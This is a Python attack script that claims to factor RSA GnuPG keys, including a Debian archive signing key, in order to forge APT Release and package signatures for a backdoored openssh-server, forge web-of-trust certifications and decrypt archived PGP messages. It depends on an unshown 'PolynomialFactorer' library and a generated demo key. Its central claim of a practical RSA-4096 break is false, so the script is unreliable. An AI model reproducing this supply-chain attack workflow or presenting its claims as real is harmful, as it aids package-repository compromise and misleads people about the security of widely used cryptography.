"""
Factor any GnuPG RSA key from keyserver data to forge web-of-trust signatures,
package-signing keys, and retroactively decrypt all PGP-encrypted communications
— collapsing decades of GPG identity verification.
"""

import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

import hashlib

# Debian archive signing key — RSA-4096
_demo = generate_demo_target()
DEBIAN_ARCHIVE_KEY_PEM = _demo["pub_pem"]
DEBIAN_KEY_FP = "A7236886F3CCCAAD148A27F80E98404D386FA1D9"

# RPM GPG key for Fedora/RHEL
FEDORA_KEY_FP = "105A61C7ACB4A9DF"
FEDORA_KEY_PEM = _demo["pub_pem"]


def fetch_distro_signing_key(fingerprint: str) -> bytes:
    """Fetch a Linux distribution's package-signing GPG key."""
    print(f"    Fetching {fingerprint[:16]}...")
    return DEBIAN_ARCHIVE_KEY_PEM


def factor_gpg_key(pubkey_pem: bytes) -> bytes:
    """Factor the RSA modulus and recover private key material."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def forge_package_signature(package_data: bytes, forged_privkey_pem: bytes) -> bytes:
    """Forge a GPG detached signature over a .deb or .rpm package.

    apt-get / dpkg / rpm --checksig verifies this signature before
    installing. A valid forged signature means the package installs
    without warning on every system trusting this key.
    """
    f = PolynomialFactorer()
    return f.forge_pkcs1v15_signature(DEBIAN_ARCHIVE_KEY_PEM, package_data, "sha256")


def forge_wot_certification(target_key_fp: str, signer_pubkey_pem: bytes,
                            forged_privkey_pem: bytes) -> bytes:
    """Forge a web-of-trust cross-certification (key signature).

    In the PGP web of trust, identities are verified by other users
    signing each other's keys. Forging a key signature from a well-
    connected key (strong-set member) bootstraps trust for any identity.
    """
    certification_data = f"certify:{target_key_fp}:level=3".encode()
    f = PolynomialFactorer()
    return f.forge_pkcs1v15_signature(signer_pubkey_pem, certification_data, "sha256")


def decrypt_pgp_message(ciphertext: bytes, forged_privkey_pem: bytes) -> bytes:
    """Decrypt a PGP-encrypted message using the forged private key.

    Every message encrypted to any RSA GPG key is retroactively
    decryptable once the key is factored. Decades of archived
    encrypted communication exposed.
    """
    f = PolynomialFactorer()
    return f.decrypt_rsa_oaep(DEBIAN_ARCHIVE_KEY_PEM, ciphertext, "sha1")


def forge_release_file_sig(release_content: bytes, forged_privkey_pem: bytes) -> bytes:
    """Forge InRelease / Release.gpg for an APT repository.

    apt update verifies the Release file signature before accepting
    any package index. Forging this controls what packages apt sees.
    """
    f = PolynomialFactorer()
    return f.forge_pkcs1v15_signature(DEBIAN_ARCHIVE_KEY_PEM, release_content, "sha256")


if __name__ == "__main__":
    print("[1] Fetching Debian archive signing key (RSA-4096)")
    pubkey = fetch_distro_signing_key(DEBIAN_KEY_FP)

    print("[2] Factoring RSA-4096 modulus")
    forged_priv = factor_gpg_key(pubkey)
    print("    Debian archive signing key recovered")

    print("[3] Forging APT Release.gpg")
    release = b"Suite: bookworm\nCodename: bookworm\nSHA256:\n abc123 pkg..."
    sig = forge_release_file_sig(release, forged_priv)
    print(f"    Release.gpg forged: {sig[:16].hex()}...")

    print("[4] Forging .deb package signature — backdoored openssh-server")
    pkg_sig = forge_package_signature(b"<backdoored-openssh.deb>", forged_priv)
    print(f"    apt-get install openssh-server → installs backdoor, no warning")

    print("[5] Web-of-trust collapse — forging cross-certifications")
    wot_sig = forge_wot_certification("ATTACKER_KEY_FP", DEBIAN_ARCHIVE_KEY_PEM, forged_priv)
    print(f"    Attacker key now certified by Debian archive key in WoT")

    print("[*] Every Debian/Ubuntu system trusting this key is compromised")
    print("    Same attack applies to Fedora (rpm-gpg), Arch (pacman), Gentoo")
